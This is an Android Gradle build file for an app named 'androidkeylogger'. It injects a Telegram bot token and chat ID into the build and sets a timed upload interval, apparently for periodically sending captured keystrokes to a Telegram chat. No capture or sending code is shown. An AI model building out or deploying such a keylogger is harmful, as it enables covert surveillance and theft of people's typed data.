plugins {
    id 'com.android.application'
}

def localProps = new Properties()
def localFile = rootProject.file('local.properties')
if (localFile.exists()) {
    localFile.withInputStream { localProps.load(it) }
}

def prop = { String key -> localProps.getProperty(key, '') ?: '' }
def javaString = { String value ->
    '"' + value.replace('\\', '\\\\').replace('"', '\\"') + '"'
}

android {
    namespace 'com.bshu2.androidkeylogger'
    compileSdk 35

    defaultConfig {
        applicationId "com.bshu2.androidkeylogger"
        minSdk 21
        targetSdk 35
        versionCode 3
        versionName "2.1"

        // Injected from local.properties (gitignored), never committed.
        buildConfigField "String", "BOT_TOKEN", javaString(prop('TELEGRAM_BOT_TOKEN'))
        buildConfigField "String", "CHAT_ID", javaString(prop('TELEGRAM_CHAT_ID'))

        // Upload cadence. Defaults to one hour; override in local.properties
        // (e.g. TELEGRAM_UPLOAD_INTERVAL_MS=60000) to test quickly.
        def interval = prop('TELEGRAM_UPLOAD_INTERVAL_MS').replaceAll('[^0-9]', '')
        if (!interval) interval = '3600000'
        buildConfigField "long", "UPLOAD_INTERVAL_MS", interval + "L"
    }

    buildFeatures {
        buildConfig true
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}

// Kotlin stdlib 1.8+ folds the jdk7/jdk8 artifacts into the main stdlib.
// Excluding the legacy shims avoids duplicate-class errors from appcompat.
configurations.all {
    exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk7'
    exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk8'
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.7.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    testImplementation 'junit:junit:4.13.2'
}